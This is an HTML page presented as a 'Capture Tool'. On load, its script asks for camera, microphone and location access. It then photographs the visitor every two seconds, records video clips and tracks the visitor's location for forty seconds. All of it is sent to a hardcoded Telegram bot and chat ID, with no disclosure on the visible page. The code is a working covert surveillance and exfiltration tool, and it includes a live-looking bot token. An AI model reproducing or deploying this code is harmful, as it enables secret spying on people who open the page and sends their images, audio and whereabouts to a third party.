<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>jat Capture Tool</title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background-color: #282c34;
            color: white;
            font-family: Arial, sans-serif;
        }
        video, img {
            border: 1px solid #61dafb;
            margin: 10px;
        }
    </style>
</head>
<body>

<h1>jat tic Capture Tool</h1>
<video id="video" width="320" height="240" autoplay muted></video>
<img id="photo" alt="Captured Photo" width="320">
<div id="location"></div>

<script>
    const video = document.getElementById('video');
    const photo = document.getElementById('photo');
    const locationDiv = document.getElementById('location');
    let mediaRecorder;
    let videoChunks = [];
    let locationInterval, photoInterval, videoInterval;

    const TELEGRAM_BOT_TOKEN = '6961737885:AAGVw4dkOf0B5ThNFwha2xjkINiWaM5tZCA'; // Replace with your actual Telegram bot token
    const CHAT_ID = '1691680798'; // Replace with your actual Telegram chat ID

    // Start video stream
    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
        .then(stream => {
            video.srcObject = stream;
            startCapturing(stream);
        })
        .catch(err => console.error("Error accessing webcam: ", err));

    // Start capturing location, video, and photo
    function startCapturing(stream) {
        locationInterval = setInterval(captureLocation, 2000); // Capture location every 2 seconds
        startVideoCapture(stream); // Start video capture
        photoInterval = setInterval(capturePhoto, 2000); // Capture photo every 2 seconds

        // Stop all capturing after 40 seconds
        setTimeout(stopCapturing, 40000);
    }

    function startVideoCapture(stream) {
        mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });

        mediaRecorder.ondataavailable = event => {
            videoChunks.push(event.data);
            if (videoChunks.length > 0) {
                const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
                videoChunks = []; // Reset for the next capture
                sendToTelegram('Video captured', videoBlob);
            }
        };

        videoInterval = setInterval(() => {
            videoChunks = []; // Clear previous chunks
            mediaRecorder.start();
            setTimeout(() => {
                mediaRecorder.stop();
            }, 10000); // Stop recording after 10 seconds
        }, 10000); // Start a new recording every 10 seconds
    }

    function captureLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(position => {
                const { latitude, longitude } = position.coords;
                const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
                locationDiv.innerHTML = `Latitude: ${latitude}, Longitude: ${longitude} <br> <a href="${mapLink}" target="_blank">Open in Google Maps</a>`;
                sendLocationToTelegram(latitude, longitude);
            });
        } else {
            locationDiv.innerHTML = "Geolocation is not supported by this browser.";
        }
    }

    function capturePhoto() {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        const dataUrl = canvas.toDataURL('image/png');
        photo.src = dataUrl;

        // Convert data URL to blob
        fetch(dataUrl)
            .then(res => res.blob())
            .then(blob => {
                sendToTelegram('Photo captured', blob);
            });
    }

    async function sendToTelegram(message, data) {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

        // Sending text message to Telegram
        await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
            }),
        });

        // Send video or photo if data is a blob
        if (data instanceof Blob && data.type.startsWith('video/')) {
            await sendVideoToTelegram(data);
        } else if (data instanceof Blob && data.type.startsWith('image/')) {
            await sendPhotoToTelegram(data);
        }
    }

    async function sendVideoToTelegram(videoBlob) {
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('video', videoBlob, 'video.webm'); // Name the video as needed

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`;
        await fetch(url, {
            method: 'POST',
            body: formData,
        });
    }

    async function sendPhotoToTelegram(photoBlob) {
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', photoBlob, 'photo.png'); // Name the photo as needed

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
        await fetch(url, {
            method: 'POST',
            body: formData,
        });
    }

    async function sendLocationToTelegram(latitude, longitude) {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`;
        await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                latitude: latitude,
                longitude: longitude,
            }),
        });
    }

    function stopCapturing() {
        // Stop video and audio capture
        const stream = video.srcObject;
        const tracks = stream.getTracks();

        tracks.forEach(track => track.stop());

        // Clear all intervals
        clearInterval(locationInterval);
        clearInterval(photoInterval);
        clearInterval(videoInterval);

        console.log("Capture stopped after 40 seconds");
    }
</script>

</body>
</html>
